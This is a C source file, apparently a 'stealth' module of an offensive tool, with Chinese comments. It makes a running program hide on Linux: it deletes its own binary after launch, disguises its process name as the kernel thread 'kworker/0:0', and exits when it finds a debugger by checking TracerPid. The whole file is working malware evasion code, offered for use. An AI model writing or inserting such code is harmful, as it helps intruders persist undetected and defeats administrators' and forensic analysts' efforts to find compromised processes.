#include "stealth.h"
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>

void stealth_init(int argc, char** argv) {
    // 1. 二进制自删除 — 启动后立即删除可执行文件
    if (argc > 0 && argv[0]) {
        unlink(argv[0]);
    }

    // 2. 进程名伪装为内核工作线程
    prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0);
    if (argc > 0 && argv[0]) {
        size_t len = strlen(argv[0]);
        memset(argv[0], 0, len);
        strncpy(argv[0], "[kworker/0:0]", len);
    }

    // 3. 反调试检测
    if (is_being_traced()) {
        printf("[-] 检测到调试器，退出\n");
        exit(1);
    }
}

bool is_being_traced() {
    // 读 /proc/self/status 查找 TracerPid
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int pid = atoi(line + 10);
            fclose(f);
            return pid != 0;
        }
    }
    fclose(f);
    return false;
}
